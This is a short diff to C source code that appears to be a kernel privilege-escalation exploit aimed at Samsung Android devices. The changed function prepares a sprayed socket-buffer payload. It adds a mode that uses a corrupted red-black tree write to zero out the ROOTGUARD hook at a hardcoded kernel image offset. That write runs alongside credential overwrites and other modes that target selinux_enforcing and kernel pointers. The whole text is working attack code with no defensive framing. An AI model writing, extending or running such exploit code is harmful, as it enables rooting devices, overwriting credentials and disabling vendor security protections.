@@ -1615,11 +1615,19 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         use_classic = 1;
       if (env_flag("MODE4_SLIDE_ZERO", 0) || env_flag("MODE4_DATAONLY", 0) ||
           env_flag("MODE4_SLIDE_CRED", 0) || env_flag("MODE4_SLIDE_KPTR", 0) ||
-          env_flag("MODE4_SLIDE_GBOOT", 0) ||
-          env_flag("MODE4_CAPSONLY", 0)) {
-        /* CAPSONLY added: the W0.pi would write fake_fops (hardcoded
-         * parent) to the SAME target as the main tree (child+0x780),
-         * OVERWRITING the correct cred_copy value. Make W0.pi inert. */
+          env_flag("MODE4_SLIDE_GBOOT", 0)) {
+        if (env_flag("MODE4_CAPSONLY", 0)) {
+          /* COMBINED (roll 34): W0.pi = PROVEN leaf-NULL ROOTGUARD unhook
+           * *(sys_exit.funcs+0x40)=0 — same walk as the main-tree cred
+           * write. .funcs image offset 0x2950700 ("Lives" 3+ boots,
+           * NEXT_SESSION_2026-08-29). Parent = target-8 (red/black). */
+          write_pc = (data_addr(KIMAGE_TEXT_BASE + 0x02950700ULL) - 8) & ~3ULL;
+          write_pc |= 1ULL; /* red = no rebalance */
+          write_right = 0;
+          write_left = 0;
+          pr_info("CAPSONLY+GUARD: W0.pi leaf-NULL *(sys_exit.funcs)=0 "
+                  "(pc=%016zx)\n", (size_t)write_pc);
+        } else {
         /* Stack stamp writes 0 / init_cred. Heap only-left parent=fake_fops
          * onto selinux_enforcing stores a kernel pointer there (Samsung
          * EMERALD: non-NULL STORE = KP). Keep W0.pi an empty black leaf. */
@@ -1627,6 +1635,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         write_right = 0;
         write_left = 0;
         pr_info("mode4 ZERO/DATAONLY/CRED W0.pi inert 1,0,0 (stack writes)\n");
+        }
       } else if (env_flag("MODE4_WPROOF_SPRAY", 0)) {
         /* Placement oracle: marker write inside our own sprayed table. */
         use_classic = 0;
